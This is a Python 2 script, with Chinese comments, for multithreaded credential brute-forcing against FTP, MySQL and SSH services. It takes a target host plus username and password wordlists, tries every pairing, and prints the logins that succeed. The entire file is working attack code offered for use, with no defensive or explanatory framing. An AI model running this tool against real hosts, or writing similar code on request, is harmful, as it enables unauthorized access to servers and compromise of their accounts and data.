#coding:utf-8
from optparse import OptionParser
import time,re,sys,threading,Queue
import ftplib,socket,MySQLdb,paramiko

global host
queue = Queue.Queue()
#********************************************
#color
#********************************************
class bcolors:
	OKBLUE = '\033[94m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
#********************************************
#FTP爆破模块
#********************************************
class FtpBurp(threading.Thread):
	"""docstring for ftp"""
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue = queue
	def run(self):
		while True:
			user,pwd = self.queue.get()
			try:
				ftp = ftplib.FTP()                            
				ftp.connect(host,21,timeout=10)
				ftp.login(user,pwd)                             
				print bcolors.OKBLUE+'[!]\nsuccessful---username:%s --password:%s\n' % (user,pwd)
				ftp.quit()
			except ftplib.all_errors:
				print bcolors.FAIL+'[*]'+user+'----'+pwd
			self.queue.task_done()
#********************************************
#MySql爆破模块
#********************************************
class MySql(threading.Thread):
	def __init__(self,queue):
		threading.Thread.__init__(self)
		self.queue = queue
	def run(self):
		while True:
			user,pwd = self.queue.get()
			try:
				conn = MySQLdb.connect(host=host, user=user,passwd=pwd,db='mysql',port=3306)
				print bcolors.OKBLUE+'[!]\nsuccessful---username:%s --password:%s\n' % (user,pwd)
				if conn:
					conn.close()
			except MySQLdb.Error, msg:
				print bcolors.FAIL+'[*]'+user+'----'+pwd
			self.queue.task_done()
#********************************************
#SSH爆破模块
#********************************************			
class SSH(threading.Thread):
	"""docstring for SSH"""
	def __init__(self,queue):
		threading.Thread.__init__(self)
		self.queue = queue
	def run(self):
		while True:
			user,pwd = self.queue.get()	
			try:
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		 		ssh.connect(host,22,user,pwd,timeout=5)
				print bcolors.OKBLUE+'[!]\nsuccessful---username:%s --password:%s\n' % (user,pwd)
				ssh.close()
				exit()
			except Exception,e:
				print bcolors.FAIL+'[*]'+user+'----'+pwd
			self.queue.task_done()
#********************************************
#可添加web后台爆破
#********************************************
usage = 'Usage: %prog [-t target] [-m method]'
parser = OptionParser(usage)
parser.add_option('-t', dest='target', help='host')
parser.add_option('-m', dest='method', help='ways')
parser.add_option('-u', dest='username', help='username')
parser.add_option('-U', dest='usernamedic', help='username')
parser.add_option('-P', dest='passworddic', help='password')
parser.add_option('-n', dest='threading', help='Thread')

(options, args) = parser.parse_args()

if options.target == None:
	parser.print_help()
	sys.exit(0)

if options.threading:
	n = int(options.threading)
else:
	n = 5
if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', options.target):
	host = options.target
else :
	host = socket.gethostbyname(options.target)
print 'target: %s \n' % host
userlist=[]
if 	options.username :
	userlist.append(options.username)
	print 'username: %s' % options.username
elif options.usernamedic:
	userlist = [j.strip() for j in open(options.usernamedic)]  
	print 'username_number: %d $\n' % len(userlist)
passlist = [j.strip() for j in open(options.passworddic)]		
print 'password_number: %d $\n' % len(passlist)
if options.method == 'ftp':
	for i in range(n):
		m_ftp = FtpBurp(queue)
		m_ftp.setDaemon(True)
		m_ftp.start()
	for user in userlist:
		for pwd in passlist:
			queue.put((user,pwd))
if options.method == 'mysql':
	for i in range(n):
		m_sql = MySql(queue)
		m_sql.setDaemon(True)
		m_sql.start()
	for user in userlist:
		for pwd in passlist:
			queue.put((user,pwd))
			
if options.method == 'ssh':
	for i in range(n):
		m_ssh = SSH(queue)
		m_ssh.setDaemon(True)
		m_ssh.start()
	for user in userlist:
		for pwd in passlist:
			queue.put((user,pwd))
queue.join()